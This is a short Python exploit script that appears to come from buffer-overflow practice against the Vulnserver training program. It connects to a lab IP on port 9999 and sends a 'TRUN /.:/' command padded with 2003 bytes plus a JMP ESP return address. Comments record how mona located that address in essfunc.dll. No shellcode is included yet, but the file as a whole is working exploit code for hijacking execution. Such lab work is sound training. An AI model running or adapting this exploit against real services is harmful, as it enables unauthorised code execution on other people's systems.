#!/usr/bin/python
 
import sys, socket
from time import sleep

# msf-masm_shell
# nasm > JMP ESP
# 00000000  FFE4              jmp esp 
# !mona find -s "\xFF\xE4" -m essfunc.dll
# 0x625011af
# 0x625011bb

buffer = "A" * 2003 + "\xaf\x11\x50\x62"



try:
    payload = "TRUN /.:/" + buffer
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.101.14',9999))
    print ("[+] Sending the payload...\n" + str(len(buffer)))
    s.send((payload.encode()))
    s.close()
    sleep(1)

except:
    print ("Error in connection")
    sys.exit()
